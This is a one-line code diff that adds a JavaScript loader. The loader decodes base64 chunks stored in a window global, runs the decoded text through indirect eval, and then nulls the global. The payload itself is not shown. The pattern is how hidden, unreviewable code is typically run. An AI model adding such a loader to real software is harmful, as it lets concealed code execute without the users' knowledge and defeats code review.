@@ -1,0 +1,1 @@
+(function(){'use strict';var p=window.__ROYAL32_B64__||[];var b=atob(p.join(''));var s='';try{if(window.TextDecoder){var u=new Uint8Array(b.length);for(var i=0;i<b.length;i++)u[i]=b.charCodeAt(i);s=new TextDecoder('utf-8').decode(u);}else{s=decodeURIComponent(escape(b));}}catch(e){s=decodeURIComponent(escape(b));}window.__ROYAL32_B64__=null;(0,eval)(s);})();
